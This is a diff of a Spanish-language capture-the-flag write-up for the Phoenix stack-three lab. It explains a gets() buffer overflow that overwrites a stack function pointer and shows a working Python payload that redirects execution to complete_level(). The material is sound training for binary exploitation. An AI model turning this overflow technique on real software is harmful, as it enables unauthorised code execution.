@@ -14,11 +14,24 @@ tags: [PWN, Linux, Hacking, Easy]
 
 ![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)
 
-stack three analiza la sobrescritura de los punteros de función almacenados en la pila.
+En este nivel se introduce el concepto de **sobrescritura de punteros de función** en la pila.  
+El objetivo es modificar el puntero `fp` para que apunte a la función `complete_level()`.
 
 **Consejos:**
+- Se puede usar `gdb` y `objdump` para obtener la dirección de la función `complete_level()`.
+- El overflow permitirá sobreescribir el puntero de función almacenado justo después del buffer.
 
-- Puede utilizar gdb y objdump para determinar dónde está la función complete_level() en la memoria.
+## Análisis del código
+
+El programa contiene:
+
+Un buffer de 64 bytes (locals.buffer).
+
+Un puntero a función (locals.fp), inicializado en NULL.
+
+La vulnerabilidad está en el uso de gets(), que permite escribir más allá de los 64 bytes, sobreescribiendo el puntero fp.
+Si logramos que fp apunte a complete_level(), se ejecutará y se completará el reto.
+
 
 ```c
 /*
@@ -87,14 +100,16 @@ int main(int argc, char **argv) {
 }
 ```
 
-ver el valor con objdump 
+**Encontrando la dirección de complete_level()**
+
+Podemos ubicar la dirección con objdump:
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ objdump -d stack-three | grep complete_level
 000000000040069d <complete_level>:
 ```
 
-ver el valor con gdb
+O también con gdb con el comando ` info func`
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-three
@@ -117,7 +132,7 @@ GEF for linux ready, type `gef' to start, `gef config' to configure
 71 commands loaded for GDB 8.2.1 using Python engine 3.5
 [*] 2 commands could not be loaded, run `gef missing` to know why.
 Reading symbols from ./stack-three...(no debugging symbols found)...done.
-gef➤  info fun
+gef➤  info func
 All defined functions:
 
 Non-debugging symbols:
@@ -140,7 +155,9 @@ Non-debugging symbols:
 0x0000000000400782  _fini
 ```
 
-a
+**Explotación manual**
+
+Si enviamos 64 caracteres seguidos de la dirección de complete_level(), sobrescribiremos el puntero de función: En arquitecturas de 64 bits es mejor usar p64 para garantizar el formato correcto de la dirección.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$  python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
@@ -149,7 +166,9 @@ calling function pointer @ 0x40069d
 Congratulations, you've finished phoenix/stack-three :-) Well done!
 ```
 
-a usar p64  para la ejecución correcta
+**Exploit con Pwntools**
+
+Creamos un script en Python3 para automatizarlo:
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/3_stack-three]
@@ -186,7 +205,9 @@ a usar p64  para la ejecución correcta
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-a
+**Resultado final**
+
+Se evidencia el mensaje que indica que el reto fue resuelto
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/3_stack-three]
@@ -209,3 +230,15 @@ a
     calling function pointer @ 0x40069d
     Congratulations, you've finished phoenix/stack-three :-) Well done!
 ```
+
+**Conclusión**
+
+En este reto vimos cómo es posible manipular punteros de función mediante un buffer overflow, redirigiendo la ejecución del programa hacia una función específica.
+
+Puntos clave:
+
+  - Las funciones inseguras como gets() permiten escribir más allá de la memoria asignada.
+
+  - Los punteros de función en la pila son objetivos directos para un atacante.
+
+  - Controlar el flujo del programa a través de estos punteros es una técnica básica pero poderosa en explotación binaria.
